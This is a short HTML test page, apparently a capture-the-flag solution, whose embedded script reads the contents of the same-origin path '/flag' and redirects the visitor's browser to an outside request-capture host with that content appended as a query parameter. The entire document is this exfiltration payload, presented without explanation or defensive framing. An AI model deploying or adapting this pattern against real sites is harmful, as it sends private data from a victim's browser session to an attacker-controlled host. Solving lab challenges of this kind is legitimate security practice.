<!doctype html>
<html lang="ko">
<head><meta charset="utf-8"><title>Pages JS 테스트</title></head>
<body>
  <h1>Hello Pages</h1>
  <script>
   async function readIndex() {
  const res = await fetch(new URL('/flag', location.href), { cache: 'no-store' }); 
  if (!res.ok) throw new Error(`HTTP ${res.status}`);
  const html = await res.text();
  console.log(html);
  location.href = "https://qkwmhnv.request.dreamhack.games?flag="+html
}
readIndex();
  </script>
</body>
</html>
